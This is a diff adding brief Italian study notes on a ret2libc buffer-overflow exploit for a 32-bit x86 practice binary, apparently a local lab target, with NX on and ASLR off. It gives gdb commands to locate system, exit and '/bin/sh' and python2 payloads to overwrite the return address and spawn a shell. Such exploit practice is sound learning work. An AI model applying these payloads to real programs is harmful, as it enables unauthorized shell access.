@@ -1,0 +1,23 @@
+W/ NX, W/O ASLR
+
+esegui sia gdb che programma con:
+env -i PWD="/home/marco/Desktop/Overflow_Docs/X86_NX_RET2LIBC" SHELL="/bin/bash" SHLVL=0 /home/marco/Desktop/Overflow_Docs/X86_NX_RET2LIBC/vuln
+
+in gdb prima di fare qualsiasi cosa fai:
+unset env LINES
+unset env COLUMNS
+
+Trova indirizzo di system, exit, e "/bin/sh"
+
+>p system
+
+>p exit
+
+>find "/bin/sh"
+
+Trovo l'offset del return address della mia funzione:
+r $(python2 -c 'print "\xEE"* OFFSET + "\xEF\xBE\xAD\xDE"')
+Aumento offset finchè il return address non è deadbeef
+
+Dopo l'offset scrivo l'indirizzo di system, di exit, e della reference a sh
+r $(python2 -c 'print "\xEE"* OFFSET + "0xsystem" + "0xexit"+ "0xbinsh" ')
